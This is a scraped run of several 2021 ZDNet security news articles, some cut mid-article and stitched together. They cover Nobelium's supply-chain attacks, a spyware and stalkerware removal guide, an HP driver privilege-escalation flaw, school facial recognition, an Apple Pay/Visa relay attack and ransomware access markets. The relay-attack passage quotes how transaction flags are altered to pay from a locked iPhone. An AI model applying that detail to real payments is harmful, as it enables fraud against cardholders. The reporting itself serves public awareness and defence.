        "text": "By Charlie Osborne for Zero Day | October 25, 2021 | Topic: Security\nMicrosoft has warned that Nobelium, the hacking group behind the SolarWinds fiasco, has targeted at least 140 resellers and technology service providers in global IT supply chains.\nSECURITY\nExchange Server bug: Patch immediately, warns Microsoft\nAverage ransomware payment for US victims more than $6 million\nMicrosoft Patch Tuesday: 55 bugs squashed, two under active exploit\nSuspected REvil ransomware affiliates arrested\nThe best phishing target? Your smartphone\nWhy you need this $29 security key\nOn October 24, Tom Burt, Microsoft Corporate Vice President of Customer Security & Trust said in an advisory that the advanced persistent threat (APT) group, of Russian origin, has now pivoted to software and cloud service resellers in order to \"piggyback on any direct access that resellers may have to their customers' IT systems.\"\nThe Redmond giant says that Nobelium's latest campaign was spotted in May this year and no less than 140 companies have been targeted, with 14 confirmed cases of compromise. \nNobelium was responsible for the SolarWinds breach, disclosed by Microsoft and FireEye (now known as Mandiant) in December 2020. \nSolarWinds systems were breached and an update for Orion software was poisoned and later deployed to approximately 18,000 customers. \nThe APT then selected a small number of high-profile targets to exploit, including Microsoft, FireEye, the Department of Homeland Security (DHS), the Cybersecurity and Infrastructure Agency (CISA), and the US Treasury.\nAfter the malicious update was pushed through SolarWind's legitimate channels, malware was planted on these systems, including the Sunburst/Solorigate backdoor.\nMicrosoft estimates that the feat may have taken the efforts of up to 1,000 engineers. However, the latest wave of attacks does not appear to make use of any specific vulnerabilities or security flaws; instead, the group is relying on spray-and-pray credential stuffing, phishing, API abuse, and token theft in attempts to obtain account credentials and privileged access to victims' systems.  \nThe new campaign is part of the Russian threat actors' wider activities. Between July 1 and October 19, Microsoft has warned 609 customers of 22,868 hacking attempts, although the company notes that success is in the \"low single digits.\"\nPrior to July 1, Microsoft alerted customers to overall nation-state hacker attack attempts a total of 20,500 times, including a past phishing campaign launched by Nobelium that impersonated USAID. \n\"This recent activity is another indicator that Russia is trying to gain long-term, systematic access to a variety of points in the technology supply chain and [to] establish a mechanism for surveilling -- now or in the future -- targets of interest to the Russian government,\" Microsoft commented. \"Fortunately, we have discovered this campaign during its early stages, and we are sharing these developments to help cloud service resellers, technology providers, and their customers take timely steps to help ensure Nobelium is not more successful.\"\nMicrosoft has informed all impacted vendors and has also released technical guidance outlining how Nobelium attempts to move laterally across networks to reach downstream customers. \nIn a statement, Mandiant SVP and CTO, Charles Carmakal said the firm has investigated multiple cases of suspected Russian cyberattacks, of which supply chain relationships between technology providers and customers have been exploited. \n\"While the SolarWinds supply chain attack involved malicious code inserted in legitimate software, most of this recent intrusion activity has involved leveraging stolen identities and the networks of technology solutions, services, and reseller companies in North America and Europe to ultimately access the environments of organizations that are targeted by the Russian government,\" Carmakal commented.\nPREVIOUS AND RELATED COVERAGE\nTomiris backdoor discovery linked to Sunshuttle, DarkHalo hackers\nMicrosoft warns of current Nobelium phishing campaign impersonating USAID\nMicrosoft warning: This malware creates a 'persistent' backdoor for hackers\nHave a tip?

        "text": "By Charlie Osborne for Zero Day | September 27, 2021 | Topic: Security\nOur digital selves are now an established part of our identity. The emails we send, the conversations we have over social media -- both private and public -- as well as photos we share, the videos we watch, the apps we download, and the websites we visit all contribute to our digital personas.\nZDNET RECOMMENDS\nBest VPN service 2021\nEvery remote worker should consider a virtual private network to stay safe online.\nRead More\nThere are ways to prevent a government agency, country, or cybercriminals from peeking into our digital lives. Virtual private networks (VPNs), end-to-end encryption, and using browsers that do not track user activity are all common methods.\nSometimes, however, surveillance is more difficult to detect -- and is far closer to home.\nAlso: Best ethical hacking certifications \nThis guide will run through what spyware is, what the warning signs of infection are, and how to remove such pestilence from your mobile devices, if it is possible to do so.\nFor those with little time, check out the abridged version below:\nHow to discover and destroy spyware on your...\nSEE FULL GALLERY\n1 - 5 of 7\nNEXT\nWhat is nuisanceware?\nAt the bottom of the pile, you have nuisanceware, which often comes in software bundles together with legitimate, free programs. Also known as Potentially Unwanted Programs (PUP), this sort of software may interrupt your web browsing with pop-ups, change your homepage settings by force, and may also gather your browsing data in order to sell it off to advertising agencies and networks.\nAlthough considered malvertising, nuisanceware is generally not dangerous or a threat to your core privacy and security.\nWhat are spyware and stalkerware?\nSpyware and stalkerware are types of software, often considered unethical and sometimes dangerous, that can result in the theft of data including images, video, call logs, contact lists, and more.  \nThese types of software are sometimes found on desktop systems but are now most commonly implanted in mobile handsets across all operating systems. \nOperators -- whether fully-fledged cybercriminals or your nearest and dearest -- may be able to harness the software to monitor emails, SMS and MMS messages sent and received, intercept live calls for the purpose of eavesdropping across standard telephone lines or Voice over IP (VoIP) applications, covertly record environmental noise or take photos, track GPS locations, and compromise commonly-used social media apps including Facebook and WhatsApp. \nStalkerware is the next step up from spyware and has become an established term in its own right, coined after a series of investigations conducted by Motherboard. The difference between them is that spyware can be more generic in purpose: stealing OS and clipboard data and anything of potential value such as cryptocurrency wallet data or account credentials, whereas stalkerware is downloaded for a specific purpose.\nBoth terms, spyware and stalkerware, relate to similar malicious software functions. However, the latter is deemed more personal in use.\nThis can include monitoring who a partner interacts with, what your children are doing online, or spying on an employee's activities.\nWhereas spyware rarely singles out individuals, unless it is in the hands of law enforcement or unscrupulous government agencies trying to target particular people of interest -- such as political opponents, civil rights group members, lawyers, or journalists -- stalkerware is software that anyone can buy in order to spy on partners, children, or employees.\nIn order to avoid potential legal issues and alienating clients, many spyware solutions providers will market their offerings as services for parents seeking a way to monitor their child's mobile device usage or for business owners to keep an eye on their staff's online activities during work hours. \nHowever, anyone willing to pay for the software can acquire it.\nRetina-X, makers of PhoneSheriff, marketed their spyware software solution, for example, as \"parental control for mobile.\"\nPhoneSheriff, developed for the Google Android operating system, permitted location monitoring via GPS, recorded calls, enabled access to text messages, and logged websites visited. The spyware was also able to block contacts, websites, and apps.\nThe company, which also developed TeenShield, SniperSpy, and Mobile Spy, closed its doors after a hacktivist said they would \"burn them to the ground.\" Retina-X stopped taking orders for the software and offered pro-rated refunds to contracted users.\nOther forms of spyware are offered by NSO Group, an Israel-based company that markets itself as a provider of solutions to \"help government agencies prevent and investigate terrorism and crime to save thousands of lives around the globe.\" In July, reports claimed that the firm's spyware, Pegasus, is being used to target government officials, civil rights activists, and journalists worldwide. NSO Group has denied these accusations. \nWhen these types of software are used at home, there are few reasons which do not lean towards toxic relationships. With the evolution of technology, so too, has domestic abuse changed. Sometimes, stalkerware is used to monitor partners and spouses covertly, or occasionally with the full knowledge of the victim.\nSpyware and stalkerware are found less commonly in the enterprise although some software solutions are marketed for companies to keep track of employee mobile devices and their activities.\nThe lines here can be blurry, but if a mobile device belongs to a company and is used by a staff member in the full knowledge that it is tracked or monitored, then this may be considered acceptable. In these cases, employees should keep their private lives, social media, and emails on their own smartphone or tablet and off company property.\nSpyPhone Android Rec Pro: This \u00a3143 spyware claims to offer \"full control\" over a smartphone's functions, including listening in to the background noise of calls and recording them in their entirety; intercepting and sending copies of SMS and MMS messages sent from the victim's phone, sending activity reports to the user's email address, and more.\nFlexiSpy: One of the most well-known forms of stalkerware out there is FlexiSpy, which markets itself using the slogan: \"It takes complete control of the device, letting you know everything, no matter where you are.\" FlexiSpy is able to monitor both Android smartphones and PCs and is willing to deliver a device with the malware pre-installed to users. The spyware is able to listen in on calls, spy on apps including Facebook, Viber, and WhatsApp, turn on the infected device's microphone covertly, record Android VoIP calls, exfiltrate content such as photos, and intercept both SMS messages and emails. At the time of writing, marketing seems to be geared -- at least, publicly -- towards parents and business owners. The first image you see on the service's website shows a teenager on her handset, with a message, \"My dad's not here. Meet me at 10.\"\nPhoneSpector: Designed for both Android and iOS handsets, PhoneSpector claims to offer a means to \"get texts, call history, GPS location and more without having the phone in your possession.\" \nMobile Tracker, FoneMonitor, Spyera, SpyBubble, Spyzie, Android Spy, and Mobistealth are a few more examples of stalkerware which offer similar features, among many, many more in what has become a booming business.\nSpyFone is another. This company was recently ordered by the FTC to delete all of its stored data, harvested from infected devices -- and to make an effort to inform victims that their mobile devices have been compromised. SpyFone is now known as Support King.\nIt is also worth noting that you can be tracked by legitimate software which has been abused. Whether or not GPS is turned on, some information recovery apps and services designed to track down a handset in the case of loss or theft can be turned against victims to track their location instead.\nWhat are the warning signs of spyware?\nIf you find yourself the recipient of odd or unusual social media messages or emails, this may be a warning sign and you should delete them without clicking on any links or downloading any files. The same goes for SMS content, too, which may contain links to lure you into unwittingly downloading spyware. \nTo catch a victim unaware, these messages -- known as phishing attempts -- will attempt to lure you into clicking a link or executing software that hosts a spyware/stalkerware payload. \nShould operators employ this tactic, they need their victims to respond. In order to ensure this, messages may contain content designed to induce panic, such as a demand for payment, a failed delivery notice, or they could potentially use spoofed addresses from a contact you trust.\nWhen it comes to stalkerware, initial infection messages may be more personal and tailored to the victim. \nThere's no magic button to send spyware over the air; instead, physical access or the accidental installation of spyware by the victim is necessary. However, it can take less than a minute to install some variants of spyware and stalkerware, and so the required time window is short.\nIf your mobile goes missing and reappears with different settings or changes that you do not recognize, or perhaps has been confiscated for a time, this may be an indicator of tampering.\nSurveillance software is becoming more sophisticated and can be difficult to detect. However, not all forms of spyware and stalkerware are invisible and it is possible to find out if you are being monitored.\nAndroid: A giveaway on an Android device is a setting that allows apps to be downloaded and installed outside of the official Google Play Store. \nIf enabled, this may indicate tampering and jailbreaking without consent. Not every form of spyware and stalkerware requires a jailbroken device, however. There is an app available in the Play Store called Root Checker that can check for jailbreaking on your behalf.\nThis setting is found in modern Android builds in Settings > Security > Allow unknown sources. (This varies depending on device and vendor.)\nYou can also check Apps > Menu > Special Access > Install unknown apps to see if anything appears which you do not recognize, but there is no guarantee that spyware will show up on the list.\nSome forms of spyware will also use generic names to avoid detection. If a process or app comes up on the list you are not familiar with, a quick search online may help you ascertain whether it is legitimate.\niOS: iOS devices, unless jailbroken, are generally harder to install with malware. However, the presence of an app called Cydia, which is a package manager that enables users to install software packages on a jailbroken device, may indicate tampering unless you knowingly downloaded the software yourself.\nIf you think your PC may have been infiltrated, check below:\nWindows: On Windows machines, double-checking installed program lists -- possible through the start bar -- and running processes under \"Task Manager\" may help you identify suspicious programs.\nMac: On Apple Mac machines, you can do the same by clicking \"Launchpad,\" \"Other,\" and \"Activity Monitor\" to check the status of running programs. You can also reach Activity Monitor quickly through Spotlight.\nAn antivirus scan is also a recommended way to remove spyware and PUP.\nIn the cases of Android, iOS devices, and PCs, you may experience unexpected battery drain and overheating, as well as unexpected or strange behavior from the device operating system or apps -- but in the latter case, many users of stalkerware will try not to play their hand and the software is developed to be as silent as possible.\nAs with most things in life, trust your instincts. If you think something is wrong, it probably is -- and you should take steps to seize control of the situation.\nThis is where things get difficult. By design, spyware and stalkerware are hard to detect and can be just as hard to remove. It is not impossible in most cases but may take some drastic steps on your part.\nWhen removed, especially in the case of stalkerware, some operators will receive an alert warning them that the victim's device has been cleaned up. In addition, should the flow of information suddenly cease, this is a clear indicator that the malicious software has been eradicated.\nRun a malware scan: On both mobile and PCs there is a variety of mobile antivirus solutions available which may be able to detect and remove basic forms of spyware. This is the easiest solution available but may not prove effective in every case.\nChange all of your passwords: If you suspect account compromise, change every password on every important account you have. Many of us have one or two central accounts, such as an email address, which will act as a hub for other accounts and password recovery. Begin there. It might also be an idea to remove access to any 'hub' services you use from a device you think has been compromised and only access them from another source.\nEnable two-factor authentication (2FA), in which account activity and logins require further consent from a mobile device, can also help protect individual accounts. However, spyware may intercept the codes sent during 2FA protocols.\nConsider creating a new email address, known only to you, which becomes tethered to your main accounts.\nUpdate your OS: It may seem obvious, but when an operating system releases a new version which often comes with security patches and upgrades, this can -- if you're lucky -- cause conflict and problems with spyware. In the same way as antivirus solutions, keep this updated.\nProtect your device physically: A PIN code, pattern, or enabling biometrics can protect your mobile device from future tampering. However, it will not help if a device has already been compromised. \nIf all else fails, factory reset.. or junk it: Performing a factory reset and clean install on the device you believe is compromised may help eradicate some forms of spyware and stalkerware. However, make sure you remember to back up important content first. On Android platforms, this is usually found under Settings > General Management > Reset > Factory Data Reset. On iOS, go to Settings > General > Reset. \nUnfortunately, some stalkerware services may survive factory resets. So, failing all of that, consider restoring to factory levels and then throwing your device away.\nREMOVAL \nFlexiSpy removal: FlexiSpy may masquerade on Android devices under the name \"SyncManager.\" If you find this app on your phone, try to uninstall it directly, and then restart your phone. However, it may also appear under another generic name, and so before deleting any apps, perform a search on the app name first.\nZDNET RECOMMENDS\nBest VPN services\nBest security keys\nBest antivirus software\nThe fastest VPNs\nCybersecurity vendors including Malwarebytes, Avast, and Kaspersky all offer spyware-scanning tools. You can try downloading them and performing a scan to wipe out infections. \nSO, WHAT ARE GOOGLE AND APPLE DOING ABOUT THE PROBLEM?\nBoth Google and Apple are generally quick off the mark if spyware or other forms of malicious apps manage to circumvent the privacy and security barriers imposed for applications hosted in their respective official app stores. \nIn July 2019, Google removed seven apps from the same Russian developer from the Play Store. While marketed as employee and child trackers, the tech giant took a dim view of their overreaching functions -- including GPS device tracking, access to SMS messages, the theft of contact lists, and potentially the exposure of communication taking place in messaging applications. \nWhen it comes to Apple, the iPad and iPhone maker began a crackdown on parental control apps in April 2019, citing privacy-invading functions as the reason for some iOS apps to be removed from the App Store. In some cases, Apple requested developers to remove functions, whereas, in others, the apps were simply removed. The company offers its own parental device control service called Screen Time for parents that want to limit their children's device usage. \nMicrosoft includes Microsoft Defender with modern versions of the Windows operating system to stop, isolate, and remove malware.\nSurveillance without consent is unethical and in domestic situations causes a severe imbalance in power. If your sixth sense says something is wrong, listen to it.\nA physical object is not worth sacrificing your privacy for. Should your device become compromised, take back control of your right to privacy -- whether or not this means replacing your handset entirely.\nSECURITY\nExchange Server bug: Patch immediately, warns Microsoft\nAverage ransomware payment for US victims more than $6 million\nMicrosoft Patch Tuesday: 55 bugs squashed, two under active exploit\nSuspected REvil ransomware affiliates arrested\nThe best phishing target?

Your smartphone\nWhy you need this $29 security key\nOn Tuesday, researchers from SentinelLabs published a technical deep-dive on the bug, tracked as CVE-2021-3437 and issued with a CVSS score of 7.8. \nSentinelLabs says the high-severity flaw impacts \"millions of devices worldwide,\" including a wide variety of OMEN gaming laptops and desktops, as well as HP Pavilion and HP ENVY models.\nFound by SentinelLabs researcher Kasif Dekel, CVE-2021-3437 is a privilege escalation vulnerability in the HP OMEN Command Center. The gaming hub can be used to adjust settings to a gamer's preference -- including fan speeds and overclocking -- as well as to monitor a PC and network's overall performance.\nA driver developed by HP and used by the software, HpPortIox64.sys, is the source of the security issue. According to the researchers, code partially comes from WinRing0.sys, an OpenLibSys driver used to manage actions including read/write kernel memory. \n\"The link between the two drivers can readily be seen as on some signed HP versions the metadata information shows the original filename and product name,\" SentinelLabs noted.\nPrivilege escalation bugs have been found in the WinRing0.sys driver in the past, including flaws that allow users to exploit the IOCTLs interface to perform high-level actions.\nSeveral lines of code in the driver's IOCTL system call function \"allow user mode applications with low privileges to read/write 1/2/4 bytes to or from an IO port,\" the team says, which could potentially be exploited to allow unprivileged users to conduct system-level actions.\n\"This high severity flaw, if exploited, could allow any user on the computer, even without privileges, to escalate privileges and run code in kernel mode,\" the researchers say. \"Among the obvious abuses of such vulnerabilities are that they could be used to bypass security products. An attacker with access to an organization's network may also gain access to execute code on unpatched systems and use these vulnerabilities to gain local elevation of privileges. Attackers can then leverage other techniques to pivot to the broader network, like lateral movement.\"\nHP OMEN Gaming Hub prior to version 11.6.3.0 and the HP OMEN Gaming Hub SDK Package, prior to 1.0.44, are impacted. At the time of writing, there is no evidence that the bug has been exploited in the wild. \nSentinelLabs reported its findings on February 17, 2021. By May 14, HP sent a proposed fix to the researchers, but it was found that the patch was not sufficient. The tech giant's security team then changed its tactic and disabled the vulnerable feature to resolve the security flaw, delivered on June 7. A patched version of the software was made available on July 27 in the Microsoft Store.\n\"We would like to thank HP for their approach to our disclosure and for remediating the vulnerabilities quickly,\" the researchers commented. \"We urge users of these products to ensure they take appropriate mitigating measures without delay.\"\nHP has published a security advisory on CVE-2021-3437, describing the flaw as a privilege escalation and denial-of-service issue.\n\"We constantly monitor the security landscape and value work that helps us identify new potential threats,\" HP told ZDNet. \"We have posted a security bulletin.

Your smartphone\nWhy you need this $29 security key\nLast week, the Information Commissioner's Office (ICO), the UK's data and privacy regulator, intervened after nine schools in North Ayrshire, Scotland, began scanning student faces to take payment for school lunches. \nAt the time, more schools were expected to follow suit. The scheme was defended as a cashless, quick, and contactless means of payment in light of COVID-19. \nHowever, the ICO and privacy outfits were quick to note that in a time where law enforcement is roundly criticized for using the same technology on the streets, introducing it in schools may be unnecessary. \nBig Brother Watch director Silkie Carlo said:\n\"It's normalizing biometric identity checks for something that is mundane. You don't need to resort to airport-style [technology] for children getting their lunch.\"\nThe ICO told The Guardian that the organization would contact North Ayrshire council to talk about data protection laws concerning minors and to see if a \"less intrusive\" payment option was available. \nThis could include contactless payment on cards or fingerprint readers, the former of which is widely used in the United Kingdom. \nAs reported by the BBC, the local council has \"temporarily paused\" the program, while one of the schools has completely closed down the scheme. \n\"Whilst we are confident the new facial recognition system is operating as planned, we felt it prudent to revert to the previous PIN (personal identification number) system while we consider the inquiries received,\" the North Ayrshire Council tweeted. \nOne of the companies named as involved in the rollout, CRB Cunninghams, describes the technology as \"a contactless biometric method that enhances the speed of service and retains the security of fingerprints.\"\nIn other facial recognition news, several weeks ago, the European Parliament voted in favor of a resolution barring law enforcement in the region from using facial recognition technologies. While not legally binding, the parliamentary body is currently working on rules to rein in the use of facial recognition and artificial intelligence (AI) across both the public and private sectors. \nZDNet has reached out to CRB Cunninghams for comment. \nPREVIOUS AND RELATED COVERAGE\nEuropean Parliament passes non-binding resolution to ban facial recognition\nBrewDog exposed data of 200,000 shareholders for over a year\nUK Information Commissioner launches probe into private email use at Department of Health\nHave a tip?

        "text": "By Charlie Osborne for Zero Day | September 30, 2021 | Topic: Security\nUK academics have uncovered mobile security issues in Visa and Apple payment mechanisms that could result in fraudulent contactless payments.\nSECURITY\nExchange Server bug: Patch immediately, warns Microsoft\nAverage ransomware payment for US victims more than $6 million\nMicrosoft Patch Tuesday: 55 bugs squashed, two under active exploit\nSuspected REvil ransomware affiliates arrested\nThe best phishing target? Your smartphone\nWhy you need this $29 security key\nOn Thursday, academics from the UK's University of Birmingham and University of Surrey revealed the technique, in which attackers could bypass an Apple iPhone's lock screen to access payment services and make contactless transactions. \nA paper on the research, \"Practical EMV Relay Protection,\" (.PDF) is due to be published at the 2022 IEEE Symposium on Security and Privacy, and has been authored by Andreea-Ina Radu, Tom Chothia, Christopher J.P. Newton, Ioana Boureanu, and Liqun Chen.\nAccording to the paper, the 'vulnerability' occurs when Visa cards are set up in Express Transit mode in an iPhone's wallet feature. Express mode has been designed with commuters in mind, when they may want to quickly tap and pay at a turnstile to access rail, for example, rather than hold up a line due to the need to go through further identity authentication. \nThe researchers say that the issue, which only applies to Apple Pay and Visa, is caused by the use of a unique code -- nicknamed \"magic bytes\" -- that is broadcast by transit gates and turnstiles to unlock Apple Pay. \nBy using standard radio equipment, they were able to perform a relay attack, \"fooling an iPhone into thinking it was talking to a transit gate,\" according to the team.\nAn experiment was conducted using an iPhone with a Visa transit card set up, a Proxmark -- to act as a reader emulator -- an NFC-enabled Android phone, which acted as a card emulator, and a payment terminal: the overall aim being to make a payment on a locked device to an EMV (smart payment) reader.\nIf an intended victim is in close proximity, whether held by someone or stolen, the attack can be triggered by capturing and then broadcasting the \"magic bytes\" and then modifying a set of other variables, as explained below:\n\"While relaying the EMV messages, the Terminal Transaction Qualifiers (TTQ), sent by the EMV terminal, need to be modified such that the bits (flags) for Offline Data Authentication (ODA) for Online Authorizations supported and EMV mode supported are set. \nOffline data authentication for online transactions is a feature used in special-purpose readers, such as transit system entry gates, where EMV readers may have intermittent connectivity and online processing of a transaction cannot always take place. These modifications are sufficient to allow relaying a transaction to a non-transport EMV reader, if the transaction is under the contactless limit.\"\nThe attack has been demonstrated in the video below. The experiment was performed with an iPhone 7 and an iPhone 12. Transactions over the contactless limit may also potentially be modified, but this requires additional value changes. \nThe experiment is an interesting one, although in the real world, this attack technique may not be feasible on a wider scale. It should also be noted that authorization protocols are only one layer of payment protection, and financial institutions often implement additional systems to detect suspicious transactions and mobile fraud. The overall fraud level on Visa's global network is recorded as below 0.1%.\nSpeaking to ZDNet, the researchers said that Apple was first contacted on October 23, 2020. The team then reached out to Visa in January, followed by a video call in February, and then a report was submitted to Visa's vulnerability reporting platform on May 10, 2021. \nThe academics say that while acknowledged by both parties, who have been spoken to \"extensively,\" the issue remains unfixed.\n\"Our work shows a clear example of a feature, meant to incrementally make life easier, backfiring and negatively impacting security, with potentially serious financial consequences for users,\" Radu commented. \"Our discussions with Apple and Visa revealed that when two industry parties each have partial blame, neither are willing to accept responsibility and implement a fix, leaving users vulnerable indefinitely.\"\nIn a statement, Visa told us:\n\"Visa cards connected to Apple Pay Express Transit are secure and cardholders should continue to use them with confidence. Variations of contactless fraud schemes have been studied in laboratory settings for more than a decade and have proven to be impractical to execute at scale in the real world. Visa takes all security threats very seriously, and we work tirelessly to strengthen payment security across the ecosystem.\"\nThe research was conducted as part of the TimeTrust trusted computing project and was funded by the UK National Cyber Security Centre (NCSC).\nUpdate 7.43 BST: Apple told ZDNet:\n\"We take any threat to users' security very seriously. This is a concern with a Visa system but Visa does not believe this kind of fraud is likely to take place in the real world given the multiple layers of security in place. In the unlikely event that an unauthorized payment does occur, Visa has made it clear that their cardholders are protected by Visa's zero liability policy.\"\nSeperately, DinoSec has compiled a log of lock screen bypass issues impacting Apple iOS since 2011. \nPREVIOUS AND RELATED COVERAGE\nThis cryptocurrency miner is exploiting the new Confluence remote code execution bug\nCritical Zoom vulnerability triggers remote code execution without user input\nRCE is back: VMware details file upload vulnerability in vCenter Server\nHave a tip?

However, once vaccines were developed, a market was born out of consumers who wanted their shots as quickly as possible. \nNot everyone wants a vaccination, however, and with international restrictions imposed for non-vaccinated travelers, some are looking for alternatives -- including fake records.\nAccording to research conducted by Intel 471, the vaccine trade is still strong, but numerous cybercriminals are now also offering fake COVID-19 vaccine certifications focused on US and EU entry requirements.\nThe US Centers for Disease Control and Prevention (CDC) vaccination cards are issued by vaccine providers in a paper format. The EU also offers a vaccine passport, the EU Digital COVID Certificate, which is issued to European residents in a paper and digital form. \nUnderground forum posts advertise their fake certificate wares together with coronavirus claims and misinformation, such as that the \"minority ruling is trying to destroy mankind\" and the vaccines are \"poisonous.\"\n\"We do this to help people who are in critical situations and want to travel urgently,\" one advert read. \nOn one forum, a trader is offering counterfeit CDC cards, whereas, on another, EU and specifically French documents containing QR codes are being displayed. \nThe QR codes on legitimate vaccine passports are designed to pull vaccination records from healthcare providers.

Your smartphone\nWhy you need this $29 security key\nOn Monday, KELA published a report on listings made by ransomware operators in the underground, including access requests -- the way to gain an initial foothold into a target system -- revealing that many want to buy a way into US companies with a minimum revenue of over $100 million.\nInitial access is now big business. Ransomware groups such as Blackmatter and Lockbit may cut out some of the legwork involved in a cyberattack by purchasing access, including working credentials or the knowledge of a vulnerability in a corporate system. \nWhen you consider a successful ransomware campaign can result in payments worth millions of dollars, this cost becomes inconsequential -- and can mean that cybercriminals can free up time to strike more targets. \nThe cybersecurity company's findings, based on observations in dark web forums during July 2021, suggest that threat actors are seeking large US firms, but Canadian, Australian, and European targets are also considered. \nRussian targets are usually rejected immediately, and others are considered \"unwanted\" -- including those located in developing countries -- likely because potential payouts are low. \nRoughly half of the ransomware operators will, however, reject offers for access into organizations in the healthcare and education sector, no matter the country. In some cases, government entities and non-profits are also off the table.\nIn addition, there are preferred methods of access. Remote Desktop Protocol (RDP), Virtual Private Network (VPN)-based access prove popular. Specifically, access to products developed by companies including Citrix, Palo Alto Networks, VMWare, Cisco, and Fortinet.  \n\"As for the level of privileges, some attackers stated they prefer domain admin rights, though it does not seem to be critical,\" the report states.\nKELA\nKELA also found offerings for e-commerce panels, unsecured databases, and Microsoft Exchange servers -- although these may be more appealing for data stealers and criminals attempting to implant spyware and cryptocurrency miners.  \n\"All these types of access are undoubtedly dangerous and can enable threat actors to perform various malicious actions, but they rarely provide access to a corporate network,\" the researchers noted.\nRoughly 40% of listings were created by players in the Ransomware-as-a-Service (RaaS) space. \nKELA\nRansomware operators are willing to pay, on average, up to $100 000 for valuable initial access services.\nIn a past study, KELA observed another trend of note in the ransomware space: increasing demand for negotiators. RaaS operators are attempting to better monetize the stage of an attack when a victim will contact ransomware operators to negotiate a payment, but as language barriers can cause miscommunication, ransomware groups are trying to secure new team members able to manage conversational English. \nIntel 471 has also found that cybercriminals involved in Business Email Compromise (BEC) scams are trying to recruit native English speakers. As phishing email red flags include poor grammar and spelling mistakes, scam artists are trying to avoid being detected at the first hurdle by paying English speakers to write convincing copy. \nPREVIOUS AND RELATED COVERAGE\nBlack Hat: Enterprise players face 'one-two-punch' extortion in ransomware attacks\nWhat is ransomware?
